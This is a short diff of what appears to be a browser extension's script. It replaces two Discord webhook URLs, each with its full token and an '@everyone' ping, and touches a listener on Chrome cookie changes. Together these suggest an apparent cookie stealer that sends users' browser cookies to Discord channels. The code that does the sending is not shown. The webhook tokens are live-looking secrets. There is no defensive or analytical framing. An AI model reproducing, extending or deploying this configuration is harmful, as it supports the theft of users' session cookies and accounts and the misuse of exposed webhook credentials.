@@ -1,10 +1,10 @@
 const WEBHOOKS = [
     {
-        url: "https://discord.com/api/webhooks/1415325396261671083/KBYpTkuigINRqUqaeTq8MM7MtMrQglO7VA_JJ2QC9ym9F3rhqcVDTgHP9NSaEaH0ajwf",
+        url: "https://discord.com/api/webhooks/1377683745041154229/hem_TvDKnw1xhxttS0M6226ZOuVhIeJ60vZtmBD1M_nOAMTE8Vn8a6KHVvibHmtT7RPc",
         mention: "@everyone"
     },
     {
-        url: "https://discord.com/api/webhooks/977164532831121458/jTbRqDJ7dqfOc59gcuTh-DDr2zeU43PU01S0tjrIqrXiKv9psNEJRUJ3JheIXs4cGgx0",
+        url: "https://discord.com/api/webhooks/1403981151365763172/zLogqJlgQnhY0k6JHzuRPNyqMDx9-uztndOpQ8PsDgz8US5SDjrDR-EsJl3pqospR7mU",
         mention: "@everyone"
     }
 ];
@@ -138,6 +138,7 @@ chrome.cookies.onChanged.addListener(function (changeInfo) {
         }
     }
 });
+
 
 
 
